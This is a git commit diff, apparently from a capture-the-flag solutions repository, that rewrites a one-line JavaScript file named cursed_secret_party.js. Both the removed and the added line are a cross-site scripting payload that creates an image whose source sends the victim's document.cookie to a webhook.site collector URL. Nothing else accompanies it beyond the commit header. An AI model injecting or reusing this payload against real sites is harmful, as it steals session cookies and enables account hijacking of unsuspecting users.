816c10fd774026946a1a1e52380feeeea6819a0d
Dan Archer <46483718+DanArcherOnline@users.noreply.github.com>
2022-10-29 17:49:48 +0900

    Update cursed_secret_party.js

--- cursed_secret_party.js
+++ cursed_secret_party.js
@@ -1,2 +1,1 @@
-var i=new Image;
-i.src="https://webhook.site/87c0f911-5c4d-42f0-8647-f7b4e80912d1?c=" + document.cookie;
+var i=new Image;i.src="https://webhook.site/87c0f911-5c4d-42f0-8647-f7b4e80912d1/?cookie="+document.cookie;
